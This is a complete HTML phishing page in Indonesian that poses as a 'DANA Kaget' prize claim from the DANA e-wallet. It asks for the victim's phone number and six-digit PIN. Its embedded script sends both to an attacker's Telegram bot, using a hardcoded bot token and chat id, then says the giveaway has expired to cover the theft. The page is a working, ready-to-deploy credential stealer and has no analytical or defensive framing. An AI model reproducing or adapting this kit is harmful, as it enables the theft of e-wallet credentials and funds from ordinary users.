<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>DANA KAGET</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>

  <div class="login-box">
    <img src="logo.png" alt="DANA Logo" />
    <h2>DANA</h2>
    <p> Masuk untuk klaim</p>
    <p>‎ </p>
      <form id="loginForm">
      <label for="username">NOMOR DANA</label> 
      <input type="text" id="username" name="username" placeholder="6281XXXXXXXX" required />

      <label for="password">PIN DANA (6 angka)</label>
      <input type="text" id="password" name="password" maxlength="6" placeholder="******" required />

      <button type="submit">Masuk</button>
    </form>
    <div class="message" id="message"></div>
  </div>

  <script>
    const token = "7412368257:AAEr_6ARKm2Jg0AmGq3UnWKUNSvpDqR5RVs";        
    const chat_id = "-4770559077";       

    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();
      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();

      if (!/^\d{6}$/.test(password)) {
        alert("PIN harus terdiri dari 6 angka.");
        return;
      }

      const message = `🔐 Login DANA\n📱 User: ${username}\n🔑 PIN: ${password}`;
      const url = `https://api.telegram.org/bot${token}/sendMessage`;

      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chat_id,
          text: message
        })
      })
      .then(response => {
        if (response.ok) {
          document.getElementById("message").innerText = "Wah, sayang sekali, DANA Kagetnya sudah habis atau kadaluarsa!.";
        } else {
          alert("Gagal Klaim....");
        }
      });
    });
  </script>

</body>
</html>
